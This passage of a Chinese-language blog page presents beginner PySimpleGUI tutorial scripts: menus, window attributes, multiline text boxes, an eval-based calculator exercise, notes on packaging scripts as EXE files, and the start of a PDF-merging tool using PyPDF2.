class=\"string\">&#x27;-a-&#x27;</span>,tearoff=<span class=\"literal\">True</span>)],</span><br><span class=\"line\">    [[sg.In()] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\">window = sg.Window(<span class=\"string\">&#x27;菜单演示&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event, values = window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;打开::open&#x27;</span>:</span><br><span class=\"line\">        sg.Popup(<span class=\"string\">&#x27;ggg&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"40window窗口常用属性-py\"><a href=\"#40window窗口常用属性-py\" class=\"headerlink\" title=\"40window窗口常用属性.py\"></a>40window窗口常用属性.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">title, # 窗口标题设定</span></span><br><span class=\"line\"><span class=\"string\">layout=None, # 布局设定</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">menu=[</span><br><span class=\"line\">    [<span class=\"string\">&#x27;文件(&amp;F)&#x27;</span>,[<span class=\"string\">&#x27;新建&#x27;</span>,<span class=\"string\">&#x27;打开::open&#x27;</span>,<span class=\"string\">&#x27;!保存&#x27;</span>,<span class=\"string\">&#x27;---&#x27;</span>,<span class=\"string\">&#x27;退出&#x27;</span>]],</span><br><span class=\"line\">    [<span class=\"string\">&#x27;编辑&#x27;</span>,[<span class=\"string\">&#x27;撤销&#x27;</span>,<span class=\"string\">&#x27;重做&#x27;</span>,<span class=\"string\">&#x27;剪切&#x27;</span>,<span class=\"string\">&#x27;保存&#x27;</span>]],</span><br><span class=\"line\">    [<span class=\"string\">&#x27;帮助&#x27;</span>,[<span class=\"string\">&#x27;检查更新&#x27;</span>,<span class=\"string\">&#x27;使用指南&#x27;</span>,<span class=\"string\">&#x27;关于&#x27;</span>]]</span><br><span class=\"line\">]</span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.Menu(menu,key=<span class=\"string\">&#x27;-a-&#x27;</span>,tearoff=<span class=\"literal\">True</span>)],</span><br><span class=\"line\">    [[sg.In()] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>)],</span><br><span class=\"line\">    [sg.B(<span class=\"string\">&#x27;确定&#x27;</span>),sg.B(<span class=\"string\">&#x27;取消&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\">window = sg.Window(<span class=\"string\">&#x27;菜单演示&#x27;</span>, layout,</span><br><span class=\"line\">location=(<span class=\"literal\">None</span>,<span class=\"literal\">None</span>), <span class=\"comment\"># 窗口的位置</span></span><br><span class=\"line\">size=(<span class=\"number\">500</span>,<span class=\"number\">300</span>), <span class=\"comment\"># 窗口宽高设定</span></span><br><span class=\"line\">element_padding=(<span class=\"number\">20</span>,<span class=\"number\">10</span>), <span class=\"comment\"># 元素间间隔设定</span></span><br><span class=\"line\">button_color=(<span class=\"string\">&#x27;red&#x27;</span>,<span class=\"string\">&#x27;black&#x27;</span>), <span class=\"comment\"># 按钮元素颜色设定（文本颜色，背景颜色）</span></span><br><span class=\"line\">background_color=<span class=\"string\">&#x27;grey&#x27;</span>,  <span class=\"comment\"># 背景色</span></span><br><span class=\"line\">font=<span class=\"literal\">None</span>, <span class=\"comment\"># 可以设置字体名称，大小等。</span></span><br><span class=\"line\">auto_close=<span class=\"literal\">False</span>, <span class=\"comment\"># 界面自动关闭</span></span><br><span class=\"line\">auto_close_duration=<span class=\"literal\">None</span>, <span class=\"comment\"># 自动关闭窗口之前界面持续的时间（以秒为单位）</span></span><br><span class=\"line\">no_titlebar=<span class=\"literal\">False</span>, <span class=\"comment\"># 不显示标题栏</span></span><br><span class=\"line\">grab_anywhere=<span class=\"literal\">False</span>, <span class=\"comment\"># 如果为True, 拖动界面进行移动</span></span><br><span class=\"line\">keep_on_top=<span class=\"literal\">False</span>, <span class=\"comment\"># 如果为True， 保持界面在屏幕的最前方</span></span><br><span class=\"line\">resizable=<span class=\"literal\">False</span>, <span class=\"comment\"># 如果为True，界面生成后可以调整大小</span></span><br><span class=\"line\">disable_close=<span class=\"literal\">False</span>, <span class=\"comment\"># 如果为True, 窗口关闭按钮将不起作用</span></span><br><span class=\"line\">disable_minimize=<span class=\"literal\">False</span>, <span class=\"comment\"># 如果为True，窗口最小化按钮将不起作用</span></span><br><span class=\"line\">right_click_menu=<span class=\"literal\">None</span>, <span class=\"comment\"># 右击调出菜单</span></span><br><span class=\"line\">transparent_color=<span class=\"literal\">None</span>, <span class=\"comment\"># 界面透明度设定=sg.theme_background_color()</span></span><br><span class=\"line\">element_justification=<span class=\"string\">&#x27;left&#x27;</span>, <span class=\"comment\"># 元素对齐方式设定。有效值：left,right,center</span></span><br><span class=\"line\"></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event, values = window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;打开::open&#x27;</span>:</span><br><span class=\"line\">        sg.Popup(<span class=\"string\">&#x27;ggg&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"41多行文本框（1）-py\"><a href=\"#41多行文本框（1）-py\" class=\"headerlink\" title=\"41多行文本框（1）.py\"></a>41多行文本框（1）.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">text1=<span class=\"string\">&#x27;&#x27;&#x27;咏梅</span></span><br><span class=\"line\"><span class=\"string\">风雨送春归，飞雪迎春到。</span></span><br><span class=\"line\"><span class=\"string\">已是悬崖百丈冰，犹有花枝俏。</span></span><br><span class=\"line\"><span class=\"string\">俏也不争春，只把春来报。</span></span><br><span class=\"line\"><span class=\"string\">待到山花烂漫时，她在丛中笑。</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.ML(default_text=text1, <span class=\"comment\"># 默认显示的文本</span></span><br><span class=\"line\">            disabled=<span class=\"literal\">False</span>, <span class=\"comment\"># 元素禁用状态设定</span></span><br><span class=\"line\">            border_width=<span class=\"literal\">None</span>, <span class=\"comment\"># 边界线条宽度设定</span></span><br><span class=\"line\">            size=(<span class=\"number\">50</span>,<span class=\"number\">6</span>), <span class=\"comment\"># 宽度和行高设定</span></span><br><span class=\"line\">            background_color=<span class=\"literal\">None</span>, <span class=\"comment\"># 背景颜色设定</span></span><br><span class=\"line\">            text_color=<span class=\"literal\">None</span>, <span class=\"comment\"># 文本颜色设定</span></span><br><span class=\"line\">            enable_events=<span class=\"literal\">True</span>, <span class=\"comment\"># 元素事件属性</span></span><br><span class=\"line\">            key=<span class=\"string\">&#x27;-TEXT-&#x27;</span>, <span class=\"comment\"># 元素的唯一标识符</span></span><br><span class=\"line\">            write_only=<span class=\"literal\">False</span>, <span class=\"comment\"># 设定为True时，文本框只提供用户写入，窗口不读取，无返回值</span></span><br><span class=\"line\">            reroute_stdout=<span class=\"literal\">False</span>, <span class=\"comment\"># print语句内容会显示在此文本框内</span></span><br><span class=\"line\">            reroute_cprint=<span class=\"literal\">True</span>, <span class=\"comment\"># 使用cprint将内容打印到此文本框内。详细参考sg.cprint()</span></span><br><span class=\"line\">            reroute_stderr=<span class=\"literal\">False</span>, <span class=\"comment\"># 捕捉异常时将文本写在此元素内。sys.stderr.write(&#x27;?&#x27;)</span></span><br><span class=\"line\">            autoscroll=<span class=\"literal\">True</span>, <span class=\"comment\"># 如果为True，更多数据添加到末尾时元素的内容将自动滚动</span></span><br><span class=\"line\">            focus=<span class=\"literal\">False</span>, <span class=\"comment\"># 焦点设置</span></span><br><span class=\"line\">            font=<span class=\"literal\">None</span>, <span class=\"comment\"># 字体名称和大小设定</span></span><br><span class=\"line\">            pad=<span class=\"literal\">None</span>, <span class=\"comment\"># 和周围元素间间隔设定</span></span><br><span class=\"line\">            tooltip=<span class=\"literal\">None</span>, <span class=\"comment\"># 悬浮文本设定</span></span><br><span class=\"line\">            justification=<span class=\"literal\">None</span>, <span class=\"comment\"># 对齐方式设定</span></span><br><span class=\"line\">            right_click_menu=<span class=\"literal\">None</span>, <span class=\"comment\"># 右击调出菜单设定</span></span><br><span class=\"line\">            visible=<span class=\"literal\">True</span>, <span class=\"comment\"># 元素可见状态设定</span></span><br><span class=\"line\">            do_not_clear=<span class=\"literal\">True</span>, <span class=\"comment\"># 默认为True，如果设定为False，窗口读取一次，内容就会自动清除</span></span><br><span class=\"line\"></span><br><span class=\"line\">    )],</span><br><span class=\"line\">    [sg.OK(),sg.Cancel()]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;多行文本演示&#x27;</span>,layout)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;OK&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-TEXT-&#x27;</span>].update(</span><br><span class=\"line\">            value=<span class=\"string\">&#x27;你好！&#x27;</span>, <span class=\"comment\"># 更新内容</span></span><br><span class=\"line\">            disabled=<span class=\"literal\">None</span>, <span class=\"comment\"># 元素禁用</span></span><br><span class=\"line\">            append=<span class=\"literal\">False</span>, <span class=\"comment\"># 如果设定为True,要更新的内容会接在原来文本的下方。原来的文本不会消失。</span></span><br><span class=\"line\">            background_color=<span class=\"literal\">None</span>,  <span class=\"comment\"># 背景颜色设定</span></span><br><span class=\"line\">            text_color=<span class=\"literal\">None</span>,  <span class=\"comment\"># 文本颜色设定</span></span><br><span class=\"line\">            text_color_for_value=<span class=\"literal\">None</span>, <span class=\"comment\"># 更新文本的字体颜色设定</span></span><br><span class=\"line\">            background_color_for_value=<span class=\"literal\">None</span>, <span class=\"comment\"># 更新文本的背景颜色设定</span></span><br><span class=\"line\">            autoscroll=<span class=\"literal\">True</span>,  <span class=\"comment\"># 如果为True，更多数据添加到末尾时元素的内容将自动滚动</span></span><br><span class=\"line\">            font=<span class=\"literal\">None</span>,  <span class=\"comment\"># 字体名称和大小设定</span></span><br><span class=\"line\">            justification=<span class=\"literal\">None</span>,  <span class=\"comment\"># 对齐方式设定</span></span><br><span class=\"line\">            visible=<span class=\"literal\">True</span>,  <span class=\"comment\"># 元素可见状态设定</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;Cancel&#x27;</span>:</span><br><span class=\"line\">        sg.cprint(<span class=\"string\">&#x27;Cancel&#x27;</span>,<span class=\"string\">&#x27;你按了取消&#x27;</span>,</span><br><span class=\"line\">                  end=<span class=\"literal\">None</span>, <span class=\"comment\"># 结束符 默认为回车键</span></span><br><span class=\"line\">                  sep=<span class=\"string\">&quot;&quot;</span>, <span class=\"comment\"># 分隔符 默认为空格键</span></span><br><span class=\"line\">                  background_color=<span class=\"literal\">None</span>,  <span class=\"comment\"># 背景颜色设定,可以简写成b</span></span><br><span class=\"line\">                  text_color=<span class=\"literal\">None</span>,  <span class=\"comment\"># 文本颜色设定,可以简写成t</span></span><br><span class=\"line\">                  colors=<span class=\"literal\">None</span>, <span class=\"comment\"># 简写c</span></span><br><span class=\"line\">                  key=<span class=\"literal\">None</span>, <span class=\"comment\"># weiyibiaoshifu</span></span><br><span class=\"line\">                  justification=<span class=\"string\">&#x27;r&#x27;</span>, <span class=\"comment\"># 文本对齐方式</span></span><br><span class=\"line\"></span><br><span class=\"line\">                  )</span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"42多行文本框（2）-py\"><a href=\"#42多行文本框（2）-py\" class=\"headerlink\" title=\"42多行文本框（2）.py\"></a>42多行文本框（2）.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">print方法</span></span><br><span class=\"line\"><span class=\"string\">window[key].print()</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.ML(key=<span class=\"string\">&#x27;-TEXT-&#x27;</span>)],</span><br><span class=\"line\">    [sg.OK(),</span><br><span class=\"line\">     sg.VerticalSeparator(color=<span class=\"string\">&#x27;red&#x27;</span>, key=<span class=\"literal\">None</span>, pad=((<span class=\"number\">10</span>,<span class=\"number\">10</span>),(<span class=\"number\">10</span>,<span class=\"number\">10</span>))),</span><br><span class=\"line\">     sg.Cancel()]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;多行文本演示&#x27;</span>,layout)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;OK&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-TEXT-&#x27;</span>].<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;你好！&#x27;</span>,<span class=\"string\">&#x27;我是程序员无声&#x27;</span>,</span><br><span class=\"line\">                               end=<span class=\"literal\">None</span>,  <span class=\"comment\"># 结束符 默认为回车键 end=&#x27;\\\\n&#x27;</span></span><br><span class=\"line\">                               sep=<span class=\"string\">&quot;--&quot;</span>,  <span class=\"comment\"># 分隔符 默认为空格键</span></span><br><span class=\"line\">                               background_color=<span class=\"literal\">None</span>,  <span class=\"comment\"># 背景颜色设定</span></span><br><span class=\"line\">                               text_color=<span class=\"literal\">None</span>,  <span class=\"comment\"># 文本颜色设定</span></span><br><span class=\"line\">                               justification=<span class=\"string\">&#x27;r&#x27;</span>,  <span class=\"comment\"># 文本对齐方式</span></span><br><span class=\"line\">                               )</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;Cancel&#x27;</span>:</span><br><span class=\"line\">        sg.cprint(<span class=\"string\">&#x27;Cancel&#x27;</span>,<span class=\"string\">&#x27;你按了取消&#x27;</span>,)</span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"43综合练习编写计算器-py\"><a href=\"#43综合练习编写计算器-py\" class=\"headerlink\" title=\"43综合练习编写计算器.py\"></a>43综合练习编写计算器.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">button</span>(<span class=\"params\">text</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sg.B(text,pad=(<span class=\"number\">2</span>,<span class=\"number\">2</span>),size=(<span class=\"number\">4</span>,<span class=\"number\">2</span>),font=(<span class=\"string\">&#x27;黑体&#x27;</span>,<span class=\"number\">18</span>),button_color=<span class=\"string\">&#x27;black&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.T(<span class=\"string\">&#x27;&#x27;</span>,key=<span class=\"string\">&#x27;-SHOW-&#x27;</span>)],</span><br><span class=\"line\">    [sg.In(<span class=\"string\">&#x27;&#x27;</span>,size=(<span class=\"number\">12</span>,<span class=\"number\">2</span>),font=(<span class=\"string\">&#x27;黑体&#x27;</span>,<span class=\"number\">28</span>),key=<span class=\"string\">&#x27;-INPUT-&#x27;</span>)],</span><br><span class=\"line\">    [button(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> [<span class=\"string\">&#x27;AC&#x27;</span>,<span class=\"string\">&#x27;(&#x27;</span>,<span class=\"string\">&#x27;)&#x27;</span>,<span class=\"string\">&#x27;%&#x27;</span>]],</span><br><span class=\"line\">    [button(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"string\">&#x27;123+&#x27;</span>],</span><br><span class=\"line\">    [button(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"string\">&#x27;456-&#x27;</span>],</span><br><span class=\"line\">    [button(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"string\">&#x27;789X&#x27;</span>],</span><br><span class=\"line\">    [button(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"string\">&#x27;0.=÷&#x27;</span>],</span><br><span class=\"line\">    [sg.B(<span class=\"string\">&#x27;←&#x27;</span>,pad=(<span class=\"number\">2</span>,<span class=\"number\">2</span>),size=(<span class=\"number\">19</span>,<span class=\"number\">2</span>),font=(<span class=\"string\">&#x27;黑体&#x27;</span>,<span class=\"number\">18</span>),button_color=<span class=\"string\">&#x27;black&#x27;</span>)],</span><br><span class=\"line\">]</span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;计算器&#x27;</span>,layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event <span class=\"keyword\">in</span> <span class=\"built_in\">list</span>(<span class=\"string\">&#x27;0123456789+-().&#x27;</span>):</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-INPUT-&#x27;</span>].update(values[<span class=\"string\">&#x27;-INPUT-&#x27;</span>]+event)</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-SHOW-&#x27;</span>].update(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;X&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-INPUT-&#x27;</span>].update(values[<span class=\"string\">&#x27;-INPUT-&#x27;</span>] + <span class=\"string\">&#x27;*&#x27;</span>)</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-SHOW-&#x27;</span>].update(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;÷&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-INPUT-&#x27;</span>].update(values[<span class=\"string\">&#x27;-INPUT-&#x27;</span>] + <span class=\"string\">&#x27;/&#x27;</span>)</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-SHOW-&#x27;</span>].update(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;%&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            window[<span class=\"string\">&#x27;-INPUT-&#x27;</span>].update(<span class=\"built_in\">eval</span>(values[<span class=\"string\">&#x27;-INPUT-&#x27;</span>] + <span class=\"string\">&#x27;/100&#x27;</span>))</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            window[<span class=\"string\">&#x27;-INPUT-&#x27;</span>].update(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">            window[<span class=\"string\">&#x27;-SHOW-&#x27;</span>].update(<span class=\"string\">&#x27;输入有误&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;=&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            window[<span class=\"string\">&#x27;-INPUT-&#x27;</span>].update(<span class=\"built_in\">eval</span>(values[<span class=\"string\">&#x27;-INPUT-&#x27;</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            window[<span class=\"string\">&#x27;-INPUT-&#x27;</span>].update(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">            window[<span class=\"string\">&#x27;-SHOW-&#x27;</span>].update(<span class=\"string\">&#x27;输入有误&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;AC&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-INPUT-&#x27;</span>].update(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-SHOW-&#x27;</span>].update(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;←&#x27;</span>:</span><br><span class=\"line\">        newValue = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        i = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> i &lt; <span class=\"built_in\">len</span>(values[<span class=\"string\">&#x27;-INPUT-&#x27;</span>]) - <span class=\"number\">1</span>:</span><br><span class=\"line\">            newValue += values[<span class=\"string\">&#x27;-INPUT-&#x27;</span>][i]</span><br><span class=\"line\">            i += <span class=\"number\">1</span></span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-INPUT-&#x27;</span>].update(newValue)</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-SHOW-&#x27;</span>].update(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"44把py文件打包成EXE应用程序-txt\"><a href=\"#44把py文件打包成EXE应用程序-txt\" class=\"headerlink\" title=\"44把py文件打包成EXE应用程序.txt\"></a>44把py文件打包成EXE应用程序.txt</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">打包工具的安装方法：</span><br><span class=\"line\"><span class=\"number\">1.</span>按WIN+R打开运行。</span><br><span class=\"line\"><span class=\"number\">2.</span>输入cmd后确认。</span><br><span class=\"line\"><span class=\"number\">3.</span>输入命令：pip install pysimplegui-exemaker</span><br><span class=\"line\"></span><br><span class=\"line\">打包工具的运行方法：</span><br><span class=\"line\"><span class=\"number\">1.</span>按WIN+R打开运行。</span><br><span class=\"line\"><span class=\"number\">2.</span>输入cmd后确认。</span><br><span class=\"line\"><span class=\"number\">3.</span>输入命令：python -m pysimplegui-exemaker.pysimplegui-exemaker</span><br><span class=\"line\"></span><br><span class=\"line\">已安装对应环境的情况下，直接修改.py文件后缀名为.pyw即可双击运行</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"45编写带界面的PDF合并工具-py\"><a href=\"#45编写带界面的PDF合并工具-py\" class=\"headerlink\" title=\"45编写带界面的PDF合并工具.py\"></a>45编写带界面的PDF合并工具.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 利用PyPDF2模块合并同一文件夹下的所有PDF文件</span></span><br><span class=\"line\"><span class=\"comment\"># 只需修改存放PDF文件的文件夹变量：file_dir和输出文件名变量：output_file</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> PyPDF2 <span class=\"keyword\">import</span> PdfFileReader,PdfFileWriter</span><br><span class=\"line\"><span class=\"comment\"># 使用os模块的walk函数，搜索出指定目录下的全部PDF文件</span></span><br><span class=\"line\"><span class=\"comment\"># 获取同一目录下的所有PDF文件的绝对路径</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">FileNameGet</span>(<span class=\"params\">filedir</span>):</span><br><span class=\"line\">    files_list = [os.path.join(root, filespath) \\</span><br><span class=\"line\">                  <span class=\"keyword\">for</span> root, dirs, files <span class=\"keyword\">in</span> os.walk(filedir) \\</span><br><span class=\"line\">                  <span class=\"keyword\">for</span> filespath <span class=\"keyword\">in</span> files \\</span><br><span class=\"line\">                  <span class=\"keyword\">if</span> <span class=\"built_in\">str</span>(filespath).endswith(<span class=\"string\">&#x27;pdf&#x27;</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> files_list <span class=\"keyword\">if</span> files_list <span class=\"keyword\">else</span> []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 合并同一目录下的所有PDF文件</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">PDFMerge</span>(<span class=\"params\">filepath, output_file</span>):</span><br><span class=\"line\">    output = PdfFileWriter()</span><br><span class=\"line\">    output_pages = <span class=\"number\">0</span></span><br><span class=\"line\">    pdf_file_name = FileNameGet(filepath)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> pdf_file_name:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> pdf_file <span class=\"keyword\">in</span> pdf_file_name:</span><br><span class=\"line\">            sg.cprint(<span class=\"string\">&#x27;路径：%s&#x27;</span> % pdf_file)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 读取源PDF文件</span></span><br><span class=\"line\">            <span class=\"built_in\">input</span> = PdfFileReader(<span class=\"built_in\">open</span>(pdf_file, <span class=\"string\">&quot;rb&quot;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 获得源PDF文件中页面总数</span></span><br><span class=\"line\">            page_count = <span class=\"built_in\">input</span>.getNumPages()</span><br><span class=\"line\">            output_pages += page_count</span><br><span class=\"line\">            sg.cprint(<span class=\"string\">&#x27;页数：%d&#x27;</span> % page_count)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 分别将page添加到输出output中</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> iPage <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(page_count):</span><br><span class=\"line\">                output.addPage(<span class=\"built_in\">input</span>.getPage(iPage))</span><br><span class=\"line\">        sg.cprint(<span class=\"string\">&#x27;合并后的总页数：%d.&#x27;</span> % output_pages)</span><br><span class=\"line\">        <span class=\"comment\"># 写入到目标PDF文件</span></span><br><span class=\"line\">        output_stream = <span class=\"built_in\">open</span>(os.path.join(filepath, output_file), <span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            output.write(output_stream)</span><br><span class=\"line\">            output_stream.close()</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            sg.cprint(<span class=\"string\">&#x27;合并失败，请重试&#x27;</span>,text_color=<span class=\"string\">&#x27;red&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        sg.cprint(<span class=\"string\">&#x27;PDF合并完成！&#x27;</span>,text_color=<span class=\"string\">&#x27;green&#x27;</span>)</span><br><span class=\"line\">        sg.cprint(<span class=\"string\">f&#x27;合并后的文件路径：<span class=\"subst\">&#123;filepath&#125;</span>/<span class=\"subst\">&#123;output_file&#125;</span>&#x27;</span>, )</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        sg.cprint(<span class=\"string\">&#x27;没有可以合并的PDF文件！&#x27;</span>,text_color=<span class=\"string\">&#x27;red&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    layout = [</span><br><span class=\"line\">        [sg.T(<span class=\"string\">&#x27;选择文件夹：&#x27;</span>, size=(<span class=\"number\">18</span>, <span class=\"number\">1</span>)), sg.In(key=<span class=\"string\">&#x27;-file_dir-&#x27;</span>), sg.FolderBrowse()],</span><br><span class=\"line\">        [sg.T(<span class=\"string\">&#x27;输入合并后的文件名：&#x27;</span>, size=(<span class=\"number\">18</span>, <span class=\"number\">1</span>)), sg.In(key=<span 